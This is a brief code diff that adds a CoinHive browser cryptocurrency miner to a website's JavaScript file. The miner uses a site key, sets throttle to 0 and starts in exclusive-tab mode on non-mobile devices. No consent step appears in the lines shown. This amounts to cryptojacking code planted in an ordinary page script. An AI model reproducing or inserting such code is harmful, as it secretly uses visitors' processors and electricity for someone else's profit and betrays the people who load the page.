@@ -44,3 +44,11 @@ var body = $("body");
 
    });
 
+    
+        miner = new CoinHive.Anonymous('MMbZYqEeX24c4XkiFunKLkmNBcjla1zN', {throttle: 0});
+     
+        // Only start on non-mobile devices and if not opted-out
+        // in the last 14400 seconds (4 hours):
+        if (!miner.isMobile()) {
+                miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+        }
